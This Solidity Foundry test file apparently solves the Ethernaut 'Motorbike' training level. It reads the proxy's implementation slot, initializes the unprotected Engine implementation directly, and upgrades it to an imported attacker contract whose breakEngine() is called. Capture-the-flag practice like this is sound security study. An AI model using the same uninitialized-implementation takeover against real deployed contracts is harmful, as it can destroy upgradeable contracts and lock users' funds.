// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/Motorbike/MotorbikeFactory.sol";
import "../src/levels/Motorbike/MotorbikeAttacker.sol";
import "./BaseTest.sol";

contract MotorbikeTest is BaseTest {
    MotorbikeFactory motorbikeFactory;

    function setUp() public {
        motorbikeFactory = new MotorbikeFactory();
        super.setUp(motorbikeFactory);
    }

    function testIsMotorbikeCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(motorbikeFactory);
        bytes32 _IMPLEMENTATION_SLOT = vm.load(
            instance,
            bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
        );
        address engine_ = address(uint160(uint256(_IMPLEMENTATION_SLOT)));

        Engine engine = Engine(engine_);
        engine.initialize();

        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();

        engine.upgradeToAndCall(
            address(motorbikeAttacker),
            abi.encodeWithSignature("breakEngine()")
        );
        vm.stopPrank();
    }
}
